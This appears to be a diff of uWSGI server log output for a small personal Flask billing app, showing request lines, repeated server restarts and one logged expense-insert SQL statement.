+[pid: 10245|app: 0|req: 2/2] 127.0.0.1 () {36 vars in 614 bytes} [Fri Jan 10 09:10:52 2020] GET /favicon.ico => generated 232 bytes in 10 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 3/3] 127.0.0.1 () {40 vars in 525 bytes} [Fri Jan 10 09:11:29 2020] POST /api/all => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 4/4] 127.0.0.1 () {40 vars in 525 bytes} [Fri Jan 10 09:11:50 2020] POST /api/all => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 5/5] 127.0.0.1 () {36 vars in 458 bytes} [Fri Jan 10 09:12:27 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 6/6] 127.0.0.1 () {40 vars in 545 bytes} [Fri Jan 10 09:13:01 2020] POST /api/month_huizong => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 7/7] 127.0.0.1 () {40 vars in 545 bytes} [Fri Jan 10 09:13:57 2020] POST /api/month_huizong => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 8/8] 127.0.0.1 () {40 vars in 545 bytes} [Fri Jan 10 09:15:26 2020] POST /api/month_huizong => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 9/9] 127.0.0.1 () {40 vars in 544 bytes} [Fri Jan 10 09:16:08 2020] POST /api/month_huizong => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 10/10] 127.0.0.1 () {40 vars in 545 bytes} [Fri Jan 10 09:17:29 2020] POST /api/month_huizong => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 10245|app: 0|req: 11/11] 127.0.0.1 () {40 vars in 525 bytes} [Fri Jan 10 09:17:44 2020] POST /api/all => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+gateway "uWSGI http 1" has been buried (pid: 10246)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:44671)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Fri Jan 10 09:56:38 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:33767 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x10d3430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x10d3430 pid: 10241 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 10241)
+spawned uWSGI worker 1 (pid: 13098, cores: 1)
+spawned uWSGI http 1 (pid: 13099)
+Fri Jan 10 09:56:48 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Fri Jan 10 09:56:49 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:40658 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xe434b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xe434b0 pid: 13108 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 13108)
+spawned uWSGI worker 1 (pid: 13110, cores: 1)
+spawned uWSGI http 1 (pid: 13111)
+[pid: 13110|app: 0|req: 1/1] 127.0.0.1 () {30 vars in 398 bytes} [Fri Jan 10 11:05:54 2020] GET / => generated 3717 bytes in 10 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 2/2] 127.0.0.1 () {34 vars in 579 bytes} [Fri Jan 10 11:15:07 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 3/3] 127.0.0.1 () {34 vars in 513 bytes} [Fri Jan 10 11:15:08 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 10 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 4/4] 127.0.0.1 () {34 vars in 489 bytes} [Fri Jan 10 11:15:08 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 5/5] 127.0.0.1 () {34 vars in 473 bytes} [Fri Jan 10 11:15:08 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 6/6] 127.0.0.1 () {34 vars in 473 bytes} [Fri Jan 10 11:15:08 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+INSERT INTO bill (date, detail, huabei) VALUES ( '2020-01-10','午饭',-24.85) ;
+[pid: 13110|app: 0|req: 7/7] 127.0.0.1 () {42 vars in 761 bytes} [Fri Jan 10 11:15:23 2020] POST /insertresult => generated 304 bytes in 26 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 8/8] 127.0.0.1 () {32 vars in 423 bytes} [Fri Jan 10 16:07:34 2020] GET /login.cgi => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 9/9] 127.0.0.1 () {32 vars in 361 bytes} [Fri Jan 10 17:49:13 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 10/10] 127.0.0.1 () {34 vars in 496 bytes} [Fri Jan 10 17:52:19 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 11/11] 127.0.0.1 () {30 vars in 459 bytes} [Fri Jan 10 19:54:14 2020] GET /api/v1/pods => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 12/12] 127.0.0.1 () {34 vars in 530 bytes} [Fri Jan 10 21:04:48 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 13/13] 127.0.0.1 () {34 vars in 578 bytes} [Fri Jan 10 21:50:17 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 14/14] 127.0.0.1 () {34 vars in 512 bytes} [Fri Jan 10 21:50:18 2020] GET /apple-touch-icon-120x120-precomposed.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 15/15] 127.0.0.1 () {34 vars in 488 bytes} [Fri Jan 10 21:50:18 2020] GET /apple-touch-icon-120x120.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 16/16] 127.0.0.1 () {34 vars in 473 bytes} [Fri Jan 10 21:50:18 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 17/17] 127.0.0.1 () {34 vars in 473 bytes} [Fri Jan 10 21:50:18 2020] GET /apple-touch-icon.png => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 18/18] 127.0.0.1 () {28 vars in 399 bytes} [Fri Jan 10 22:08:13 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 19/19] 127.0.0.1 () {28 vars in 419 bytes} [Fri Jan 10 22:08:13 2020] GET /robots.txt => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 20/20] 127.0.0.1 () {28 vars in 421 bytes} [Fri Jan 10 22:08:13 2020] GET /favicon.ico => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 21/21] 127.0.0.1 () {34 vars in 478 bytes} [Fri Jan 10 22:47:14 2020] POST /ajax => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 22/22] 127.0.0.1 () {32 vars in 463 bytes} [Fri Jan 10 23:59:43 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 23/23] 127.0.0.1 () {28 vars in 313 bytes} [Fri Jan 10 23:59:44 2020] HEAD / => generated 0 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (0 switches on core 0)
+[pid: 13110|app: 0|req: 24/24] 127.0.0.1 () {32 vars in 463 bytes} [Sat Jan 11 00:02:42 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 25/25] 127.0.0.1 () {32 vars in 463 bytes} [Sat Jan 11 00:05:43 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 26/26] 127.0.0.1 () {34 vars in 496 bytes} [Sat Jan 11 01:54:31 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 27/27] 127.0.0.1 () {30 vars in 398 bytes} [Sat Jan 11 01:59:32 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 28/28] 127.0.0.1 () {32 vars in 361 bytes} [Sat Jan 11 02:27:24 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 29/29] 127.0.0.1 () {30 vars in 378 bytes} [Sat Jan 11 03:50:19 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 30/30] 127.0.0.1 () {34 vars in 492 bytes} [Sat Jan 11 04:47:01 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 31/31] 127.0.0.1 () {32 vars in 463 bytes} [Sat Jan 11 04:49:42 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 32/32] 127.0.0.1 () {26 vars in 275 bytes} [Sat Jan 11 05:36:19 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 33/33] 127.0.0.1 () {30 vars in 398 bytes} [Sat Jan 11 05:54:11 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 34/34] 127.0.0.1 () {32 vars in 454 bytes} [Sat Jan 11 08:33:44 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 35/35] 127.0.0.1 () {32 vars in 504 bytes} [Sat Jan 11 08:33:45 2020] GET /osjdmfjiwdruehnjqfefhrwui => generated 232 bytes in 0 msecs (HTTP/1.0 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 36/36] 127.0.0.1 () {34 vars in 486 bytes} [Sat Jan 11 08:36:34 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 37/37] 127.0.0.1 () {26 vars in 275 bytes} [Sat Jan 11 08:44:00 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 38/38] 127.0.0.1 () {28 vars in 415 bytes} [Sat Jan 11 09:26:21 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 13110|app: 0|req: 39/39] 127.0.0.1 () {32 vars in 455 bytes} [Sat Jan 11 10:04:51 2020] GET / => generated 3717 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+gateway "uWSGI http 1" has been buried (pid: 13111)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:40658)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:51:07 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:42519 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1146430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1146430 pid: 13108 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 13108)
+spawned uWSGI worker 1 (pid: 4827, cores: 1)
+spawned uWSGI http 1 (pid: 4828)
+Sat Jan 11 11:51:17 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:51:28 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:46341 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0xf844b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xf844b0 pid: 4860 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 4860)
+spawned uWSGI worker 1 (pid: 4866, cores: 1)
+spawned uWSGI http 1 (pid: 4867)
+gateway "uWSGI http 1" has been buried (pid: 4867)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:46341)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:53:42 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:37058 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x11d7430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x11d7430 pid: 4860 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 4860)
+spawned uWSGI worker 1 (pid: 5014, cores: 1)
+spawned uWSGI http 1 (pid: 5015)
+Sat Jan 11 11:53:51 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:54:03 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:40107 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x114a4b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x114a4b0 pid: 5045 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 5045)
+spawned uWSGI worker 1 (pid: 5048, cores: 1)
+spawned uWSGI http 1 (pid: 5049)
+gateway "uWSGI http 1" has been buried (pid: 5049)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:40107)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:55:06 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:41650 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1f47430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1f47430 pid: 5045 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 5045)
+spawned uWSGI worker 1 (pid: 5124, cores: 1)
+spawned uWSGI http 1 (pid: 5125)
+Sat Jan 11 11:55:15 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:55:27 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 4
+uwsgi socket 0 bound to TCP address 127.0.0.1:35217 (port auto-assigned) fd 3
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1c7e4b0
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1c7e4b0 pid: 5158 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 5158)
+spawned uWSGI worker 1 (pid: 5166, cores: 1)
+spawned uWSGI http 1 (pid: 5167)
+Sat Jan 11 11:56:11 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 5167)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 5166)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (127.0.0.1:35217)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:56:12 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
+uwsgi socket 0 bound to TCP address 127.0.0.1:34522 (port auto-assigned) fd 4
+Python version: 3.6.8 (default, Aug  7 2019, 17:28:10)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-39)]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1468430
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+added /home/python/flask/bill/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1468430 pid: 5158 (default app)
+mountpoint  already configured. skip.
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 5158)
+spawned uWSGI worker 1 (pid: 5233, cores: 1)
+spawned uWSGI http 1 (pid: 5234)
+Sat Jan 11 11:56:14 2020 - *** /home/python/flask/bill has been touched... grace them all !!! ***
+gateway "uWSGI http 1" has been buried (pid: 5234)
+...gracefully killing workers...
+Gracefully killing worker 1 (pid: 5233)...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/python/flask/bill
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 4 mapped to socket 0 (127.0.0.1:34522)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from bill_uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Jan 11 11:56:15 2020] ***
+compiled with version: 4.8.5 20150623 (Red Hat 4.8.5-39) on 08 December 2019 05:05:53
+os: Linux-3.10.0-957.27.2.el7.x86_64 #1 SMP Mon Jul 29 17:46:05 UTC 2019
+nodename: fushisanlang.cn
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/python/flask/bill
+detected binary path: /usr/local/bin/uwsgi
+your processes number limit is 7270
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uWSGI http bound on 0.0.0.0:30001 fd 5
